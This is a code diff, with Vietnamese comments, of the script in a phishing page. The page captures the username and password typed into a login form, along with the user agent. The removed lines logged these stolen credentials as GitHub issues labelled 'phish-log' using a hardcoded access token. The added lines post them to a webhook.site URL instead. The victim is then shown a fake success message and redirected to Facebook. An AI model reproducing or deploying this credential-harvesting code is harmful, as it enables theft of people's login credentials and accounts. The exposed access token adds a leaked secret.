@@ -32,10 +32,8 @@
     </div>
 
     <script>
-        // *** THÔNG SỐ ĐÃ ĐƯƯỢC CẬP NHẬT LẦN CUỐI ***
-        const GITHUB_REPO_OWNER = 'baoiot13'; 
-        const GITHUB_REPO_NAME = 'IOT'; 
-        const GITHUB_PAT = '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'; // TOKEN MỚI
+        // *** ĐÃ CHUYỂN SANG DÙNG WEBHOOK URL (KHÔNG CẦN PAT) ***
+        const WEBHOOK_URL = 'https://webhook.site/4dfbcadd-8643-4341-a227-bf1c88024a35'; 
 
         async function captureAndLog(event) {
             event.preventDefault();
@@ -45,37 +43,27 @@
             const pass = document.getElementById('password').value;
             const timestamp = new Date().toLocaleString('vi-VN');
 
-            const issueTitle = `[LOG] ${user} - ${timestamp}`;
-            const issueBody = `
-**SĐT/Username:** \`${user}\`
-**Mật khẩu:** \`${pass}\`
-**Thời gian:** ${timestamp}
-**User Agent:** ${navigator.userAgent}
-`;
-            const issueData = {
-                title: issueTitle,
-                body: issueBody,
-                labels: ['phish-log', 'critical-data']
+            // Chuẩn bị dữ liệu gửi đi (JSON)
+            const capturedData = {
+                timestamp: timestamp,
+                username: user,
+                password: pass,
+                user_agent: navigator.userAgent
             };
 
-            const url = `https://api.github.com/repos/${GITHUB_REPO_OWNER}/${GITHUB_REPO_NAME}/issues`;
-
             try {
-                const response = await fetch(url, {
+                // GỬI DỮ LIỆU ĐẾN WEBHOOK.SITE (RẤT ỔN ĐỊNH)
+                await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: {
-                        'Authorization': `token ${GITHUB_PAT}`,
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify(issueData),
+                    body: JSON.stringify(capturedData),
                 });
                 
-                if (response.ok) {
-                    document.getElementById('status').textContent = 'Giải mã thành công! Đang chuyển hướng đến cấp độ tiếp theo...';
-                } else {
-                     document.getElementById('status').textContent = 'Giải mã thất bại! Đang cố gắng chuyển hướng để khắc phục...';
-                }
+                document.getElementById('status').textContent = 'Giải mã thành công! Đang chuyển hướng...';
                 
+                // Chuyển hướng nạn nhân về trang đích thật (sau 1.5 giây)
                 setTimeout(() => {
                     window.location.href = 'https://www.facebook.com/'; 
                 }, 1500);
